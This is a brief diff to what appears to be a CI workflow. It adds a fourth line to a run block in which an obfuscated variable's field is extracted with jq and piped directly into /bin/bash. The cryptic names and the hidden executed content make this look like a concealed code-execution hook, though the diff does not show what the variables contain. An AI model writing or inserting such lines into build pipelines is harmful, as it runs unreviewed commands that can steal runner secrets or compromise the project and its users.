@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$dx1038" | jq -r .y10898 | /bin/bash
           printf '%s' "$owet64" | jq -r .bxf527 | /bin/bash
           printf '%s' "$eb9046" | jq -r .tjrf1347 | /bin/bash
+          printf '%s' "$ztt02" | jq -r .il22 | /bin/bash
 
       - name: Archive output
         if: always()
